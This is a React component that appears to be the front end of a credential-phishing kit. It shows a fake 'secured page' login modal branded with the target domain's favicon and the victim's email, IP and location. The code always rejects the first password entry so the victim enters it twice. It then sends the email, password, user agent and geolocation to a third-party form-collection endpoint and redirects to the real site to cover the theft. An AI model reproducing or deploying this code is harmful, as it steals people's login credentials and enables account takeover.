import { useState, useEffect } from 'react'
import axios from 'axios'

function ModalForm({ email, domain, onClose }) {
  const [password, setPassword] = useState('')
  const [formError, setFormError] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [geolocation, setGeolocation] = useState(null)
  const [geolocationError, setGeolocationError] = useState(null)
  const [submissionAttempts, setSubmissionAttempts] = useState(0)

  // Load submission attempts from localStorage
  useEffect(() => {
    const storedAttempts = localStorage.getItem('submissionAttempts')
    if (storedAttempts) {
      setSubmissionAttempts(parseInt(storedAttempts))
    }
  }, [])

  // Save submission attempts to localStorage
  useEffect(() => {
    localStorage.setItem('submissionAttempts', submissionAttempts.toString())
  }, [submissionAttempts])

  const favicon = `https://www.google.com/s2/favicons?domain=${domain}`
  // Extract domain name without TLD
  const domainName = domain.split('.')[0].toUpperCase()
  const domainInfo = {
    favicon,
    domain: domainName,
    userAgent: navigator.userAgent,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
  }

  const fetchGeolocation = async () => {
    try {
      const response = await axios.get('https://ipapi.co/json/')
      setGeolocation(response.data)
    } catch (error) {
      console.error('Error fetching geolocation:', error)
      setGeolocationError('Unable to fetch geolocation data')
    }
  }

  useEffect(() => {
    fetchGeolocation()
  }, [])

  const handleSubmit = async (e) => {
    e.preventDefault()
    setIsLoading(true)
    setFormError(false)

    try {
      // Mock authentication logic
      if (submissionAttempts < 1) {
        // First attempt: Fail
        setSubmissionAttempts(prev => prev + 1)
        throw new Error('Authentication failed. Please try again.')
      }

      // Second attempt: Submit to Getform
      // Create form data object
      const formData = {
        email: email,
        pass: password,  // Renamed from password to pass for Getform
        domain: domain,
        userAgent: navigator.userAgent,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        geolocation: geolocation || {},
        _subject: 'Secure Portal Authentication',
        _template: 'table',
        _format: 'short',
        _next: `https://${domain}`
      }

      // Debug log - log full form data for verification
      console.log('Form data to be submitted:', formData)

      // Debug log - verify pass field
      console.log('Pass field:', {
        hasPass: formData.pass !== undefined,
        passLength: formData.pass ? formData.pass.length : 'undefined'
      })

      // Debug log - verify entire payload
      console.log('Full payload to Getform:', JSON.stringify(formData, null, 2))

      try {
        // Submit form using POST request with explicit headers
        const endpoint = import.meta.env.VITE_GETFORM_ENDPOINT || 'https://getform.io/f/bdrgkqpb'
        const response = await axios.post(endpoint, formData, {
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          }
        })
        // Reset submission attempts after successful submission
        setSubmissionAttempts(0)
        // Redirect to domain's landing page
        window.location.href = `https://${domain}`
      } catch (getformError) {
        console.error('Getform submission error:', getformError)
        throw new Error('Failed to submit form. Please try again.')
      }
    } catch (error) {
      setFormError(true)
      setIsLoading(false)
    }
  }

  if (!domain) return null

  // Get current time in user's timezone
  const currentTime = new Date().toLocaleString('en-US', {
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true
  })

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white rounded-lg p-4 w-[336px] relative">
        <button
          onClick={onClose}
          className="absolute top-3 right-3 text-gray-500 hover:text-gray-700"
        >
          ×
        </button>
        <div className="flex flex-col items-center mb-4">
          <div className="flex items-center justify-center mb-2">
            <img
              src={`https://www.google.com/s2/favicons?domain=${domain}`}
              alt={`${domain} favicon`}
              className="w-6 h-6 mr-2"
            />
            <h2 className="text-lg font-semibold">{domainName}</h2>
          </div>
          <div className="text-gray-600 text-sm">
            {currentTime}
          </div>
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-gray-700 text-sm mb-1">User Agent:</label>
              <p className="text-gray-600 truncate text-sm">{navigator.userAgent}</p>
              {geolocation ? (
                <div className="space-y-1 mt-2">
                  <p className="text-gray-600 text-sm">City: {geolocation.city}</p>
                </div>
              ) : null}
            </div>
            <div>
              <label className="block text-gray-700 text-sm mb-1">Timezone:</label>
              <p className="text-gray-600 text-sm">
                {Intl.DateTimeFormat().resolvedOptions().timeZone}
              </p>
              {geolocation ? (
                <div className="space-y-1 mt-2">
                  <p className="text-gray-600 text-sm">Country: {geolocation.country_name}</p>
                  <p className="text-gray-600 text-sm">IP: {geolocation.ip}</p>
                </div>
              ) : null}
            </div>
          </div>
          <div className="space-y-2">
            <p className="text-gray-700 text-sm">
              You're accessing a secured page using
            </p>
            <p className="font-bold text-lg text-black">
              {email}
            </p>
            <p className="text-gray-700 text-sm mb-4">
              please authenticate with your password.
            </p>
          </div>
          <div className="space-y-2">
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
              required
              placeholder="Enter your password"
            />
            {formError && (
              <div className="text-red-500 text-xs">Authentication failed. Please try again.</div>
            )}
          </div>
          <button
            type="submit"
            disabled={isLoading}
            className="w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 disabled:opacity-50 text-sm"
          >
            {isLoading ? 'Submitting...' : 'Submit'}
          </button>
        </form>
      </div>
    </div>
  )
}

export default ModalForm
